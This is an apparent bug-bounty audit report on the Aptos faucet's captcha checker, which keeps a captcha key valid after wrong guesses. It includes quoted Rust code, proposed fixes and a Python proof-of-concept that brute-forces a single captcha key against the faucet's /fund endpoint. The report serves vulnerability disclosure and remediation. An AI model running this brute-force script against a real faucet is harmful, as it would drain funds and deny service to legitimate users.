# Audit Report

## Title
Captcha Brute-Force Attack: Failed Attempts Don't Invalidate Keys Enabling Unlimited Guessing

## Summary
The `check_challenge()` function in the faucet's `TapCaptchaChecker` does not invalidate captcha keys after failed attempts. This allows attackers to request a single captcha challenge and make unlimited guessing attempts, completely negating the captcha's anti-automation security benefit.

## Finding Description

The Aptos faucet implements an in-house captcha system to prevent automated abuse. The flow works as follows:

1. User calls `/request_captcha` to receive a captcha image and a random key
2. User solves the captcha and submits both key and solution to `/fund` endpoint via headers `CAPTCHA_KEY` and `CAPTCHA_VALUE`
3. The `TapCaptchaChecker.check()` method validates the submission by calling `CaptchaManager.check_challenge()` [1](#0-0) 

The vulnerability exists in the `check_challenge()` function's logic:
- When the captcha value is **correct**, the key is removed from storage (line 169)
- When the captcha value is **incorrect**, the function returns `Ok(false)` (line 172) but **does NOT remove the key**

This breaks the fundamental security assumption that captchas are one-time challenges. An attacker can exploit this by:

1. Requesting one captcha via `/request_captcha` - receives key (e.g., `12345678`) and image with 5-character solution
2. Writing a script to systematically guess all possible values:
   - For lowercase letters: 26^5 = 11,881,376 combinations
   - For alphanumeric case-insensitive: 36^5 = 60,466,176 combinations
   - For alphanumeric case-sensitive: 62^5 = 916,132,832 combinations
3. Each failed attempt returns a rejection via the checker mechanism [2](#0-1)  but the key remains valid for subsequent attempts
4. Eventually guessing correctly and successfully funding the account

The captcha generation uses 5 characters [3](#0-2)  and has no expiration mechanism [4](#0-3) . The code even contains a warning about potential OOM attacks due to lack of cleanup [5](#0-4) .

While rate limiting checkers exist [6](#0-5) , they limit requests to the `/fund` endpoint based on IP address, not captcha validation attempts per key. An attacker can:
- Distribute attempts across multiple IPs (VPN, proxies, botnets)
- Work within daily limits (e.g., 100 requests/day per IP × multiple IPs)
- Or exploit deployments without rate limiting configured

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty criteria for "Significant protocol violations." Specifically:

1. **Complete Bypass of Security Control**: The captcha is designed to prevent automated faucet abuse. This vulnerability allows attackers to completely circumvent this protection through brute-force.

2. **Automated Fund Extraction**: Attackers can script the exploitation to continuously drain faucet funds without human intervention.

3. **Resource Exhaustion**: Beyond fund loss, attackers can exhaust faucet resources, causing denial of service for legitimate users.

4. **API Abuse**: The vulnerability enables bot networks to abuse the faucet API at scale, which could be used for:
   - Creating large numbers of funded accounts for spam or sybil attacks
   - Manipulating testnet economics
   - Overwhelming downstream systems with illegitimate traffic

## Likelihood Explanation

**Likelihood: High**

- **Ease of Exploitation**: The attack requires only basic HTTP client knowledge and simple scripting
- **No Authentication Required**: The faucet is publicly accessible by design
- **Low Attacker Cost**: A single captcha request can be reused indefinitely
- **Probabilistic Success**: Even with case-sensitive alphanumeric (62^5), modern compute can attempt millions of guesses in reasonable timeframes, especially when distributed
- **Detection Difficulty**: Failed captcha attempts may not trigger alarms if monitoring focuses on successful transactions rather than validation failures

The only mitigating factors are:
- Optional rate limiting (if configured and properly tuned)
- Network/firewall-level protections (out of scope for this analysis)

## Recommendation

Implement attempt-based invalidation for captcha keys. There are two recommended approaches:

**Approach 1: Single-Attempt Invalidation (Strictest)**
```rust
pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
    match self.challenges.remove(&key) {  // Remove immediately on ANY attempt
        Some(captcha) => Ok(captcha == value),
        None => bail!("Captcha key unknown or already used: {}", key),
    }
}
```

**Approach 2: Limited-Attempt with Tracking (More User-Friendly)**
```rust
pub struct CaptchaManager {
    challenges: HashMap<u32, CaptchaChallenge>,
}

struct CaptchaChallenge {
    value: String,
    created_at: u64,
    attempts: u32,
}

pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
    match self.challenges.get_mut(&key) {
        Some(challenge) => {
            challenge.attempts += 1;
            
            // Allow max 3 attempts or expire after 5 minutes
            if challenge.attempts > 3 || 
               (get_current_time_secs() - challenge.created_at) > 300 {
                self.challenges.remove(&key);
                bail!("Captcha expired or too many attempts");
            }
            
            if challenge.value == value {
                self.challenges.remove(&key);
                Ok(true)
            } else {
                Ok(false)
            }
        },
        None => bail!("Captcha key unknown: {}", key),
    }
}
```

Additionally, implement periodic cleanup to prevent OOM attacks as noted in the existing warning comment.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Proof of Concept: Captcha Brute-Force Attack
Demonstrates unlimited guessing attempts on a single captcha key
"""

import requests
import string
import itertools

FAUCET_URL = "https://faucet.testnet.aptoslabs.com"  # Example URL
ACCOUNT_ADDRESS = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

def request_captcha():
    """Request a new captcha challenge"""
    response = requests.get(f"{FAUCET_URL}/request_captcha")
    captcha_key = response.headers.get("CAPTCHA_KEY")
    print(f"[+] Obtained captcha key: {captcha_key}")
    return captcha_key

def attempt_fund(captcha_key, captcha_value):
    """Attempt to fund account with captcha guess"""
    headers = {
        "CAPTCHA_KEY": str(captcha_key),
        "CAPTCHA_VALUE": captcha_value
    }
    payload = {"address": ACCOUNT_ADDRESS, "amount": 100000000}
    
    response = requests.post(f"{FAUCET_URL}/fund", json=payload, headers=headers)
    return response.status_code == 200, response

def brute_force_captcha(captcha_key, charset=string.ascii_lowercase, length=5):
    """Brute force captcha by trying all combinations"""
    print(f"[*] Starting brute force attack...")
    print(f"[*] Charset: {charset} (size: {len(charset)})")
    print(f"[*] Total combinations: {len(charset)**length:,}")
    
    attempts = 0
    for guess in itertools.product(charset, repeat=length):
        attempts += 1
        captcha_value = ''.join(guess)
        
        if attempts % 1000 == 0:
            print(f"[*] Attempt {attempts:,}: {captcha_value}")
        
        success, response = attempt_fund(captcha_key, captcha_value)
        
        if success:
            print(f"[+] SUCCESS! Correct captcha value: {captcha_value}")
            print(f"[+] Total attempts: {attempts:,}")
            return captcha_value
    
    print(f"[-] Failed after {attempts:,} attempts")
    return None

if __name__ == "__main__":
    print("[*] Captcha Brute-Force PoC")
    print("[!] This demonstrates the unlimited attempt vulnerability")
    
    # Step 1: Request one captcha
    captcha_key = request_captcha()
    
    # Step 2: Brute force using the same key (starts with lowercase only)
    # In practice, attacker would use more sophisticated charset detection
    result = brute_force_captcha(captcha_key, charset=string.ascii_lowercase, length=5)
    
    if result:
        print(f"[+] Attack successful - captcha bypassed!")
    else:
        print(f"[-] Attack failed (try different charset)")
```

**Expected Behavior (Vulnerable System):**
- Single captcha request succeeds
- All subsequent guessing attempts are validated against the same key
- No invalidation occurs until correct guess is found
- Eventually succeeds in funding the account

**Expected Behavior (Fixed System):**
- Single captcha request succeeds
- First failed attempt invalidates the key
- Subsequent attempts with same key are rejected
- Attacker must request new captcha for each attempt

## Notes

This vulnerability is specific to the `TapCaptchaChecker` implementation. The alternative `GoogleCaptchaChecker` that validates Google reCAPTCHA tokens is not affected, as it delegates validation to Google's API which handles attempts internally. However, deployments using the in-house `TapCaptchaChecker` are vulnerable to this attack.

### Citations

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L4-6)
```rust
//! Warning: This could be attacked and cause the server to OOM because we
//! don't throw out captchas info if it has been sitting there for too long /
//! the map grows too large.
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L106-111)
```rust
        if !captcha_correct {
            return Ok(vec![RejectionReason::new(
                format!("Captcha value {} incorrect", captcha_value),
                RejectionReasonCode::CaptchaInvalid,
            )]);
        }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L126-131)
```rust
pub struct CaptchaManager {
    /// When a challenge is created, we return to the client the captcha itself
    /// and a random key they must make the second request with. This is a map
    /// from that random key to the value of the captcha.
    challenges: HashMap<u32, String>,
}
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L147-148)
```rust
        let (name, image) = Captcha::new()
            .add_chars(5)
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L165-177)
```rust
    pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
        match self.challenges.get(&key) {
            Some(captcha) => {
                if captcha == value {
                    self.challenges.remove(&key);
                    Ok(true)
                } else {
                    Ok(false)
                }
            },
            None => bail!("Captcha key unknown: {}", key),
        }
    }
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L77-88)
```rust
        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }
```
